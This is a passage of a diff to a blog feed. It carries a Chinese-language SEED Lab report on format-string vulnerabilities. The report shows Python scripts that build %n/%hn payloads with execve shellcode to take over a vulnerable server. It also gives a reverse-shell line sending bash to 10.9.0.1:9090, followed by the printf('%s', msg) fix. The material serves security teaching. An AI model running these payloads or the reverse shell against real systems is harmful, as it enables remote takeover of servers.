+<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击64位机器，服务器选择10.9.0.6.首先发送hello消息</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170653364.png" alt="image-20231211170653364"></p>
+<p>问题：64位机器地址前两个字符为0x00，导致printf在解析地址时遇到<code>0x00</code>会停止解析（与overflow中strcpy不同，strcpy会直接截断，而此处的input仍然会传入，只是printf不会解析）</p>
+<p>可以使用<code>$kth</code>表示第k个参数，同时将地址放在input末尾避免此问题。</p>
+<p>构造payload如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">buf_addr = <span class="number">0x00007fffffffe5c0</span></span><br><span class="line">ret_addr = <span class="number">0x00007fffffffe500</span> + <span class="number">8</span></span><br><span class="line">shellcode_addr = buf_addr + start  <span class="comment"># 0x7fffffffeaf7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># target_addr for test</span></span><br><span class="line">target_addr = <span class="number">0x0000555555558010</span></span><br><span class="line">number  = ret_addr</span><br><span class="line">number1 = number + <span class="number">2</span></span><br><span class="line">number2 = number + <span class="number">4</span></span><br><span class="line">number3 = number + <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%46$.32767lx&quot;</span> + <span class="string">&quot;%46$hn&quot;</span> + <span class="string">&quot;%44$.27384lx&quot;</span> + <span class="string">&quot;%44$hn&quot;</span> + <span class="string">&quot;%45$.5384lx&quot;</span> + <span class="string">&quot;%45$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &quot;%44$lx.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">content[offset:offset+<span class="number">8</span>] = (number).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">8</span>:offset+<span class="number">16</span>] = (number1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">16</span>:offset+<span class="number">24</span>] = (number2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>其中需要注意高位地址恒为<code>0x0000</code>不需要修改，其他三个都需要进行修改。</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211193743193.png" alt="image-20231211193743193"></p>
+<h3 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h3><p>修改如下。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br></pre></td></tr></table></figure>
+
+<p>重新编译发现警告信息消失：</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194112960.png" alt="image-20231211194112960"></p>
+<p>重新进行攻击，尝试打印出前100个参数，失败：</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194819158.png" alt="image-20231211194819158"></p>
+<h3 id="9-Guidelines-on-Reverse-Shell"><a href="#9-Guidelines-on-Reverse-Shell" class="headerlink" title="9 Guidelines on Reverse Shell"></a>9 Guidelines on Reverse Shell</h3><p>只需修改shellcode内容即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>成功获取root shell</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211195911628.png" alt="image-20231211195911628"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>SEED Lab</tag>
+        <tag>Format String</tag>
       </tags>
   </entry>
   <entry>
@@ -731,101 +826,6 @@
         <tag>Fuzz</tag>
         <tag>固件模拟</tag>
         <tag>论文复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>格式化字符串实验报告</title>
-    <url>/posts/5a0832a9.html</url>
-    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
-<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>漏洞程序如下</p>
-<p><code>format.c</code>：<code>myprintf</code>存在漏洞<code>printf(msg)</code>;</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>Compilation</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cd server-code</span><br><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../fmt-containers</span><br><span class="line">cp format-* ../fmt-containers</span><br></pre></td></tr></table></figure>
-
-<p>可以看到编译中gcc会警告存在格式化字符串漏洞</p>
-<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>首先尝试向10.9.0.5发送hello消息</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150919446.png" alt="image-20231211150919446"></p>
-<p>server端结果</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150812716.png" alt="image-20231211150812716"></p>
-<p>服务器最多接受1500字节的数据，在此任务中，需要构造payload让程序崩溃（服务器不会崩溃，因为format程序是server的子进程）</p>
-<p>构造payload：<code>%s</code>，发现服务器端没有输出，程序成功crash</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151346427.png" alt="image-20231211151346427"></p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151405655.png" alt="image-20231211151405655"></p>
-<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>继续使用10.9.0.5，令服务器打印出内存中数据</p>
-<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>打印栈上数据，需要知道需要多少个<code>%.8x</code>占位符，才能使服务器程序打印出输入的前四个字节。</p>
-<p>构造python脚本，设定前四个字节为<code>0xffffffff</code>，构造100个<code>%.8x.</code>，令服务器端打印100个地址，查看前四个字节的位置。</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211152629169.png" alt="image-20231211152629169"></p>
-<p>可以看到，<code>0xffffffff</code>位于第64个<code>%.8x.</code>处。</p>
-<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆上存储着一个秘密值，可以通过服务器端输出查找到，目标为打印出secret秘密值</p>
-<p>由服务器端输出可以知道secret的地址为<code>0x080b4008</code>，因此将buffer的前四个字节设置为secret的地址，通过<code>%s</code>令服务器输出该地址的值。</p>
-<p>构造python脚本如下:</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211153657826.png" alt="image-20231211153657826"></p>
-<p>结果如上图，成功输出<code>A secret message</code>字符串</p>
-<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>继续使用10.9.0.5，目标为修改0x11223344地址的值。</p>
-<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>更改值即可，由服务器端输出可知<code>target</code>地址为<code>0x080e5068</code>，可以通过<code>%n</code>修改地址的值，构造payload。</p>
-<p>payload如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">63</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出如下图，可见<code>target</code>成功被修改为了前面输出字符的个数(4+4+63*9)&#x3D;575&#x3D;0x23f</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211154137419.png" alt="image-20231211154137419"></p>
-<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>0x5000-0x23f &#x3D;  19905 因此需要增加19905个字符。</p>
-<p>构造<code>payload</code>如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19914x&quot;</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功修改值为0x5000</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211160234002.png" alt="image-20231211160234002"></p>
-<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>值比较大，因此如果使用<code>%n</code>会导致输出时间过长，甚至可能卡死，因此需要使用<code>%hn</code>或<code>%hhn</code>一次只修改两个或一个字节。</p>
-<p>如果使用<code>%hn</code>构造payload，一次只修改两字节，则需要先修改值较小的地址，然后才能修改值较高的地址。</p>
-<p>构造前八个字节分别对应<code>0xAABB</code>和<code>0xCCDD</code>的地址，并且构造payload对两个地址的值分别进行修改：<code>0xaabb - 0x23f + 9 - 4 = 43137</code>， <code>0xccdd - 0xaabb = 8738</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number_1 = number + <span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number_1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43137x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
-
-<p>成功修改成目标值</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164056253.png" alt="image-20231211164056253"></p>
-<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164407343.png" alt="image-20231211164407343"></p>
-<p><strong>Question 1: What are the memory addresses at the locations marked by 2 and 3?</strong></p>
-<p>  ②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffcfac</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd080</code></p>
-<p><strong>Question 2: How many %x format specifiers do we need to move the format string argument pointerto 3? Remember, the argument pointer starts from the location above 1.</strong></p>
-<p>由上文可知，buf的前四字节需要64个%x才可以达到。</p>
-<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>获取server的shell。</p>
-<p>需要修改函数<code>myprintf</code>的返回地址为<code>shellcode</code>地址，将<code>shellcode</code>放在buf末尾，然后使用上文的方法将shellcode地址写入返回地址即可：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as 